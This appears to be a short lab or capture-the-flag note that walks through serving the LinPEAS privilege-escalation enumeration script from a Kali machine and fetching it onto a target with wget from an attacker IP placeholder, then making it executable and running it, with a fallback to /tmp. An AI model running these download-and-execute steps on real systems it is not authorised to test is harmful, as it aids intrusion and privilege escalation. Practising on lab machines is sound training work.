>>>>>>>>> TO DOWNLOAD LINPEAS
Download the Linpeas inside your kali
$ sudo apt install peass

Copy the Linpeas into your working Kali directory
$ cp /usr/share/peass/linpeas/linpeas.sh ~/deathnote/


Start your server
$ python -m http.server 8000


Inside the TARGET machine
$ wget http://<YOUR_KALI_IP>:8000/linpeas.sh


After that in the TARGET machine,
	chmod means change mode. It changes the permissions of a file or directory in Linux.
	This gives linpeas.sh execute permission, allowing you to run:
$ ls -l linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh

Note : if you get Permission Denied for Linpeas installation
$ pwd
$ cd /tmp
$ wget http://<YOUR_KALI_IP>:8000/linpeas.sh
